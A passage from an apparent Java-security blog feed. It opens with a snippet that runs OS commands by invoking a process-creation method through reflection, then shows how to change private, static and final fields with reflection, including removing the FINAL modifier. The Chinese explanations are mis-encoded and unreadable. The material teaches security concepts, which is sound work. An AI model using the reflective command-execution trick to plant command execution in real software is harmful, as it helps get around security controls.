<br> method.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Process</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> (Process) method.invoke(<span class="hljs-literal">null</span>, cmds, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>);  <br> <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> e.getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Java-åå°„ä¿®æ”¹-static-final-ä¿®é¥°çš„å­—æ®µ"><a href="#Java-åå°„ä¿®æ”¹-static-final-ä¿®é¥°çš„å­—æ®µ" class="headerlink" title="Java åå°„ä¿®æ”¹ static final ä¿®é¥°çš„å­—æ®µ"></a>Java åå°„ä¿®æ”¹ static final ä¿®é¥°çš„å­—æ®µ</h2><h3 id="private"><a href="#private" class="headerlink" title="private"></a>private</h3><p><strong>PrivatePerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivatePerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>PrivateReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrivateReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.PrivatePerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">PrintMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>        PrintMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m, <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;111&quot;</span>));<br>        PrintMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a03.png"></p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p><strong>StaticPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.StaticPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">nameMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        nameMethod.invoke(m);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;static&quot;</span>));<br>        nameMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>final å­—æ®µèƒ½å¦ä¿®æ”¹ï¼Œæœ‰ä¸”å–å†³äºå­—æ®µæ˜¯ç›´æ¥èµ‹å€¼è¿˜æ˜¯é—´æ¥èµ‹å€¼ï¼ˆç¼–è¯‘æ—¶èµ‹å€¼å’Œè¿è¡Œæ—¶èµ‹å€¼çš„åŒºåˆ«ï¼‰ã€‚<strong>ç›´æ¥èµ‹å€¼æ˜¯æŒ‡åœ¨åˆ›å»ºå­—æ®µæ—¶å°±å¯¹å­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œå¹¶ä¸”å€¼ä¸º JAVA çš„ 8 ç§åŸºç¡€æ•°æ®ç±»å‹æˆ–è€… String ç±»å‹ï¼Œè€Œä¸”å€¼ä¸èƒ½æ˜¯ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„ï¼Œå…¶ä»–æƒ…å†µå‡ä¸ºé—´æ¥èµ‹å€¼ã€‚</strong></p><h4 id="ç›´æ¥èµ‹å€¼-æ— æ³•ä¿®æ”¹"><a href="#ç›´æ¥èµ‹å€¼-æ— æ³•ä¿®æ”¹" class="headerlink" title="ç›´æ¥èµ‹å€¼(æ— æ³•ä¿®æ”¹)"></a>ç›´æ¥èµ‹å€¼(æ— æ³•ä¿®æ”¹)</h4><p><strong>FinalStraightPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightPerson</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1&quot;</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>-<span class="hljs-number">2</span>;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>FinalStraightReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalStraightReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.FinalStraightPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        ageField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);  <br>        ageField.set(m,<span class="hljs-string">&quot;10&quot;</span>);  <br>  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a04.png"></p><p>è¿™ä¸ªæŠ¥é”™æœ¬è´¨ä¸Šä¸æ˜¯ å› ä¸º <code>final</code>ï¼Œè€Œæ˜¯ç±»å‹ä¸åŒ¹é…ã€‚</p><ul><li><p>è¦ä¿®æ”¹çš„å­—æ®µ <code>age</code> ç±»å‹æ˜¯ <code>int</code>ï¼ˆ<strong>åŸºæœ¬ç±»å‹</strong>ï¼‰ã€‚</p></li><li><p>ä½†æ˜¯ç”¨åå°„ <code>set(m, &quot;10&quot;)</code> ä¼ è¿›å»çš„æ˜¯ <code>String</code>ã€‚</p></li><li><p>åå°„ä¸åšè‡ªåŠ¨ç±»å‹è½¬æ¢ï¼Œæ‰€ä»¥ç›´æ¥æŠ¥é”™ã€‚</p></li></ul><p>ä¿®æ”¹è¯­å¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ageField.set(m, Integer.parseInt(<span class="hljs-string">&quot;10&quot;</span>));<br></code></pre></td></tr></table></figure><p>è¿è¡Œä»£ç åçœ‹åˆ°nameä¸ageä»æœªè¢«ä¿®æ”¹</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a05.png"></p><p><strong>JVM å¯¹ final å­—æ®µçš„ç¼“å­˜ï¼ˆUnsafe &amp; åå°„é™åˆ¶ï¼‰</strong></p><ul><li>Java çš„ <code>Field.setAccessible(true)</code> è™½ç„¶å¯ä»¥çªç ´è®¿é—®æ§åˆ¶ï¼Œä½†å¯¹ <code>final</code> ä¿®é¥°çš„å­—æ®µï¼ŒJVM å¯èƒ½ä¼šåœ¨å¯¹è±¡åˆ›å»ºåæŠŠå€¼å­˜åˆ°å¯„å­˜å™¨æˆ–å†…å­˜ç¼“å­˜é‡Œã€‚</li><li>è¿™æ„å‘³ç€å³ä½¿ä½ ç”¨åå°„ä¿®æ”¹äº†å­—æ®µçš„åº•å±‚å†…å­˜ï¼Œåç»­è¯»å–å¯èƒ½ä¾æ—§ä»ç¼“å­˜é‡Œå–æ—§å€¼ã€‚</li><li>å¦å¤–ï¼Œ<code>final</code> å­—æ®µåœ¨ JDK 1.8 é‡Œï¼Œåå°„ä¿®æ”¹<strong>é»˜è®¤æ˜¯æ— æ•ˆçš„</strong>ï¼ˆé™¤éç”¨ <code>Unsafe</code> æˆ– <code>Field.modifiers</code> å»æ‰ <code>final</code> æ ‡å¿—ï¼‰ã€‚</li></ul><p>ä½†æ˜¯ä½¿ç”¨<code>Unsafe</code> æˆ– <code>Field.modifiers</code> å»æ‰ <code>final</code> æ ‡å¿—å¤§æ¦‚ç‡ä¹Ÿæ˜¯ä¸å¯è¡Œçš„</p><p><strong>JVM å¯èƒ½å·²ç»æŠŠåŸå€¼å†…è”ä¼˜åŒ–äº†</strong>ï¼Œå°¤å…¶æ˜¯åŸºæœ¬ç±»å‹ï¼ˆ<code>int</code>ã€<code>long</code> ç­‰ï¼‰å’Œ <code>String</code> å¸¸é‡â€”â€”å®ƒä»¬åœ¨ç¼–è¯‘æœŸæˆ–ç±»åŠ è½½åå°±è¢«å½“ä½œä¸å¯å˜å¸¸é‡å¤„ç†äº†ã€‚</p><p>åœ¨ JDK 8ï¼ˆä½ ç”¨çš„æ˜¯ 1.8.0_112ï¼‰é‡Œï¼Œæœ‰å‡ ä¸ªå…³é”®ç‚¹å¯¼è‡´ä½ çœ‹ä¸åˆ°ä¿®æ”¹æ•ˆæœï¼š</p><ol><li><strong>JIT å¸¸é‡æŠ˜å ï¼ˆconstant foldingï¼‰</strong><ul><li><code>final</code> åŸºæœ¬ç±»å‹å­—æ®µä¸€æ—¦è¢«åˆå§‹åŒ–ï¼ŒJVM åœ¨è¿è¡Œæ—¶ä¼šç›´æ¥æŠŠå®ƒå½“å¸¸é‡ç”¨ï¼Œè°ƒç”¨æ—¶ç›´æ¥ä»å¯„å­˜å™¨&#x2F;å¸¸é‡æ± å–ï¼Œè€Œä¸æ˜¯é‡æ–°è¯»å­—æ®µå€¼ã€‚</li><li>æ‰€ä»¥å³ä¾¿ä½ åå°„ set æˆæ–°å€¼ï¼Œåé¢çš„è°ƒç”¨ä»ç„¶ç”¨çš„æ˜¯ç¼“å­˜çš„æ—§å€¼ã€‚</li></ul></li><li><strong>ç¼“å­˜çš„ Field å€¼</strong><ul><li>æŸäº›æƒ…å†µä¸‹ï¼ŒJVM ä¼šåœ¨ç¬¬ä¸€æ¬¡è®¿é—®åæŠŠ final å­—æ®µçš„å€¼ç¼“å­˜èµ·æ¥ï¼Œåç»­ä¸ä¼šå†çœŸæ­£è®¿é—®å†…å­˜ã€‚</li></ul></li><li><strong>ä½ çš„ <code>printInfo()</code> å¯èƒ½ç›´æ¥ä½¿ç”¨äº†ç¼–è¯‘æœŸå†…è”å€¼</strong><ul><li>å¦‚æœ <code>printInfo()</code> æ–¹æ³•åœ¨åŒä¸€ä¸ªç±»é‡Œç›´æ¥è®¿é—®äº† <code>final int age</code>ï¼Œç¼–è¯‘å™¨åœ¨ç”Ÿæˆå­—èŠ‚ç æ—¶å·²ç»æŠŠå€¼â€œå†™æ­»â€äº†ã€‚</li></ul></li></ol><h4 id="é—´æ¥èµ‹å€¼"><a href="#é—´æ¥èµ‹å€¼" class="headerlink" title="é—´æ¥èµ‹å€¼"></a>é—´æ¥èµ‹å€¼</h4><p><strong>InDirectPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;male&quot;</span>);  <br>    <span class="hljs-comment">// ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„å˜é‡èµ‹å€¼  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> (<span class="hljs-literal">null</span>!=<span class="hljs-literal">null</span>?<span class="hljs-number">18</span>:<span class="hljs-number">18</span>);  <br>    <span class="hljs-comment">// é€šè¿‡æ„é€ å‡½æ•°è¿›è¡Œèµ‹å€¼  </span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InDirectPerson</span><span class="hljs-params">()</span>&#123;  <br>        name = <span class="hljs-string">&quot;1&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age+<span class="hljs-string">&quot; &quot;</span>+sex);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>InDirectReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.InDirectPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        printMethod.invoke(m);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">sexField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;sex&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        ageField.setAccessible(<span class="hljs-literal">true</span>);<br>        sexField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);<br>        ageField.set(m,<span class="hljs-number">180</span>);<br>        sexField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;female&quot;</span>));<br>        printMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸä¿®æ”¹</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a06.png"></p><h3 id="static-final"><a href="#static-final" class="headerlink" title="static + final"></a>static + final</h3><p>ä½¿ç”¨ static final ä¿®é¥°ç¬¦çš„ name å±æ€§ï¼Œå¹¶ä¸”æ˜¯é—´æ¥èµ‹å€¼ï¼Œç›´æ¥é€šè¿‡åå°„ä¿®æ”¹æ˜¯ä¸å¯ä»¥çš„ã€‚</p><p>å¦‚æœ <code>final</code> å­—æ®µæ˜¯ <strong>ç¼–è¯‘æœŸå¸¸é‡</strong>ï¼ˆ<code>static final</code> å¹¶ä¸”æ˜¯åŸºæœ¬ç±»å‹æˆ– String ä¸”å€¼å·²çŸ¥ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šç›´æ¥æŠŠå€¼<strong>å†…è”</strong>åˆ°ä½¿ç”¨å®ƒçš„åœ°æ–¹ã€‚<br> å³ä½¿ä½ ç”¨åå°„æ”¹äº†å­—æ®µå€¼ï¼ŒåŸæ¥å¼•ç”¨å®ƒçš„åœ°æ–¹è¯»çš„ä»ç„¶æ˜¯ç¼–è¯‘æœŸæ›¿æ¢è¿›å»çš„å€¼ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦é€šè¿‡åå°„, æŠŠ nameField çš„ final ä¿®é¥°ç¬¦å»æ‰ï¼Œå†èµ‹å€¼ã€‚</p><p><strong>StaticFinalPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalPerson</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticFinalReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ReflectDemo.ReflectFixFinal.pojo.StaticFinalPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameModifyField</span> <span class="hljs-operator">=</span> nameField.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);  <br>        nameModifyField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;2&quot;</span>));  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a07.png"></p>]]></content>
    
    
    <categories>
      
      <category>Javaå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„å…¶ä»–æ¼æ´</title>
    <link href="/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</url>
    
